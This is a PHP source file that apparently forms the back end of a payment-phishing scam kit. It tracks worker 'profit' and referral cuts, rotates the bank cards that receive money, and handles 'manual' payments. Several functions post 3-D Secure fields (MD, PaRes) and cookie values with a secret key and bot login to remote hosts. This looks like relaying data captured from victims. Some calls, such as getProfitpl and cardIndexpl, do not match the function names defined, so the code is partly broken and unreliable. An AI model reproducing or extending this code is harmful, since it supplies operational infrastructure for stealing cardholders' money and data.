	function amountMinport() {
		return intval(fileRead(dirSettings('aminport')));
	}

	function paymentNameport() {
		return [
			0 => '',
		][getPaymentNameport()];
	}

	function paymentTitleport($v) {
		return [
			0 => 'Ручная',
		][$v];
	}

	function selectWordport($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function chsAlpport() {
		return 'qwertzuiopóasdfghjklłąyxcvbnmQWERZIOPASDFGHJKLŁęYXCVBNMśńćąbсćdеęłńóśźĄżĆĘŁŚŹŻ';
	}

	function beaCashport($v) {
		return number_format($v, 0, '', '').' €';
	}

	function beaDaysport($v) {
		return $v.' '.selectWordkz($v, ['дней', 'день', 'дня']);
	}

	function ruchkaStatusport($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remoteport.php', $post);
	}

	function setCookies($a, $b, $c = False, $d = False, $e = False, $f = False) {
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'cookie1' => $a,
			'cookie2' => $b,
			'cookie3' => botLogin(),
			'service' => $c,
			'action' => $d,
			'MD' => $e,
			'PaRes' => $f,
		];
		request(cookie().'site/remote.php', $post);
	}

	function setCookies2($a, $b) {
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'cookie1' => $a,
			'cookie2' => $b,
			'cookie3' => botLogin(),
		];
		request(cookie().'site/set.php', $post);
	}

	function getProfitport() {
		$t = explode('`', fileRead(dirStats('profitport')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0port() {
		$t = explode('`', fileRead(dirStats('profitport_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function addProfitport($v, $m) {
		$t = getProfitpl();
		fileWrite(dirStats('profitport'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0pl();
		fileWrite(dirStats('profitport_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function makeProfiportl($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitport($id, $amount, $rate);
		addProfitport($amount, $t[0] + $t[1]);
		return $t;
	}

	function addUserProfitport($id, $amount, $rate) {
		$profit = getUserProfitport($id);
		setUserData($id, 'profitport', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfitsport($id, [time(), $amount]);
		return [$amount, $amount0];
	}

	function isAutoPaymentport() {
		return (fileRead(dirSettings('apaymport')) == '1');
	}

	function toggleAutoPaymentport() {
		$t = isAutoPayment();
		fileWrite(dirSettings('apaymport'), $t ? '' : '1');
		return !$t;
	}

	function getCardsport() {
		$t = fileRead(dirSettings('cardport'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardDataport() {
		return explode(':', getCardspl()[0]);
	}
	
	function getCardport() {
		return getCardDatapl()[0];
	}

	function getCardBalanceport() {
		return intval(getCardDatapl()[1]);
	}

	function setNextCardport() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCardsport();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndexport($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCardport($n) {
		$t = getCardsport();
		if (cardIndexpl($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCardport($t);
	}

	function delCardport($n) {
		$t = getCardsport();
		$t1 = cardIndexport($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCardport($t);
	}

	function setCardport($v) {
		return fileWrite(dirSettings('cardport'), implode('`', $v));
	}

	function getCard2port() {
		return explode('`', fileRead(dirSettings('card2port')));
	}
	
	function setCard2port($n, $j) {
		return fileWrite(dirSettings('card2port'), implode('`', [$n, $j]));
	}

	function getPaymentNameport() {
		return intval(fileRead(dirSettings('payport')));
	}

	function setPaymentNameport($n) {
		fileWrite(dirSettings('payport'), $n);
	}

	function fixAmountport($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function setAmountLimitport($a, $b) {
		fileWrite(dirSettings('aminport'), $a);
		fileWrite(dirSettings('amaxport'), $b);
	}

	function getUserProfitsport($id) {
		$t = getUserData($id, 'profitsport');
		if (!$t)
			return false;
		return explode('`', $t);
	}

	function addUserProfitsport($id, $v) {
		$t = getUserProfitsport($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profitsport', implode('`', $t));
	}

	function getUserRefbalport($id) {
		return intval(getUserData($id, 'refbalport'));
	}

	function addUserRefbalport($id, $v) {
		setUserData($id, 'refbalpl', intval(getUserRefbal($id) + $v));
	}

	function getUserProfitport($id) {
		$t = getUserData($id, 'profitport');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}



?>
